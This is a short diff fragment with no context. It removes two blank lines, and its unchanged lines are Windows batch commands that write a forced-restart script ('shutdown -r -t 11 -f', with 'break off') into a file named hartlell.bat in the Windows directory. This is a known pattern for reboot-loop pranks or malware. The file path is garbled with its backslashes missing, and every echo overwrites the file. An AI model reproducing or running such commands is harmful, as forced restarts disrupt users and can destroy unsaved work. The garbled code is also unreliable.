@@ -1,5 +1,3 @@
-
-
 echo @echo off>c:windowshartlell.bat
 echo break off>c:windowshartlell.bat
 echo shutdown -r -t 11 -f>c:windowshartlell.bat
